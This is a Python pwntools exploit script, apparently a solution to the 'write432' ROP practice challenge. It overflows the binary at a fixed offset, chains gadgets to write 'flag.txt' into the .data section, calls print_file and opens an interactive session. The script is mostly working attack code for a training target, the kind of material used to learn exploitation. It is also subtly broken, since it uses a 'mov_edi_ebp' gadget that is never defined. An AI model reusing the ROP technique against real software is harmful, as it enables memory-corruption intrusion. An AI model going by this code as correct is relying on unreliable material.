from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./write432', checksec=False)
p = process()

# How many bytes to EIP?
offset = 44

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section (size=8 bytes)
data_section_address = elf.symbols.data_start
info("%#x data_section_address", data_section_address)

pop_edi_pop_ebp = rop.find_gadget(["pop edi", "pop ebp", "ret"])[0]
info("%#x pop edi; pop ebp; ret;", pop_edi_pop_ebp)


rop.raw([pop_edi_pop_ebp, data_section_address, 'flag', mov_edi_ebp])
rop.raw([pop_edi_pop_ebp, data_section_address + 0x4, '.txt', mov_edi_ebp])
rop.print_file(data_section_address)

# Chain it together (get the raw ROP bytes)
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop_chain
})

# Save payload to file
with open("payload", "wb") as f:
    f.write(payload)
# PWN
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

# Get our flag!
p.interactive()